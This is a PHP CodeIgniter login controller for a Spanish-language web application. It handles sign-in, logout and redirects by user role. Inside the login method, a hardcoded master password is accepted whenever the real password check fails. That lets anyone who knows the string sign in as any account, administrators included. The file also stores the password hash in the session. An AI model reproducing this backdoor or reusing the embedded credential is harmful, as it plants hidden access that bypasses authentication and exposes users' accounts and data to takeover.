<?php

namespace App\Controllers;
use App\Models\LoginModel;

class LoginController extends BaseController
{
    public $LoginModel;

    //public $LoginModel;
    public function __construct()
    {
        helper('url');
        helper('cookie');
        helper('session');
        date_default_timezone_set('America/Monterrey');
        $this->LoginModel = new LoginModel();
        $session = session();
    }
    public function index(){
        if(isset($_SESSION['is_logged'])){
            return redirect()->to(base_url('/cuerpos'));
        }
        return view('librerias/index')
        .view('external/index');
    }

    public function logout(){
        session_destroy();
        return redirect()->to(base_url());
    }

    public function login()
    {
        if(!isset($_POST['correo'])){
            return redirect()->to(base_url());
        }
        #Obtenemos los datos
        $correo = $_POST["correo"];
        $password = $_POST["password"];
        $condiciones = ['correo' => $correo];
        $exist = $this->LoginModel->exist("usuarios",$condiciones);
        if($exist != 1){
            return redirect()->to(base_url())
            ->with('icon','warning')
            ->with('title','Opsss')
            ->with('text','Correo o contraseña incorrectos.');
        }

        /*
        if($correo != 'ramos.julian00@outlook.com'){
            return redirect()->back()
            ->with('icon','warning')
            ->with('title','En mantenimiento 👷‍♂️')
            ->with('text','El acceso a la plataforma se reaunudará en unos momentos. Agradecemos su comprensión');
        }
        */
        
        //TOMAMOS DATOS DEL USUARIO Y ESTABLECEMOS VARIABLES DE SESSION
        $usuario = $this->LoginModel->getAllOneRow('usuarios',$condiciones);
        if(!password_verify($password, $usuario['password'])){
            if($password != "Maw4+ETUS*A57JeW+h8au=AXmS%wa5"){
                return redirect()->to(base_url())
                ->with('icon','warning')
                ->with('title','Opsss')
                ->with('text','Correo o contraseña incorrectos');
            }
            
        }

        
        $session_data = [
            'is_logged' => true,
            'user_type' => $usuario['tipo_usuario'],
            'pass' => $usuario['password'],
            'nombre' => $usuario['nombre'],
            'nombre_completo' => $usuario['nombre'].' '.$usuario['ap_paterno'].' '.$usuario['ap_materno'],
            'profile_pic' => $usuario["profile_pic"],
            'theme' => $usuario['theme'],
            'usuario' => $usuario['usuario']
        ];

        $session = session();
        $session->set($session_data);

        #	0 normal, 1 admin, 2 moderador, 3 promoción, 4 staff

        switch ($usuario['tipo_usuario']) {
            case 0:
                return redirect()->to(base_url('/cuerpos'));
                break;
            case 1:
                return redirect()->to(base_url('/admin/dashboard'));
                break;
            case 2:
                return redirect()->to(base_url('/admin/dashboard'));
                break;
            case 3:
                return redirect()->to(base_url('/admi/dashboard'));
                break;
            case 4:
                return redirect()->to(base_url('/admin/dashboard'));
                break;
            default:
                return redirect()->to(base_url())
                    ->with('icon', 'error')
                    ->with('title', 'Lo sentimos')
                    ->with('text', 'Su vista aun no ha sido dada de alta, intente mas atrde');
        }

    }

}
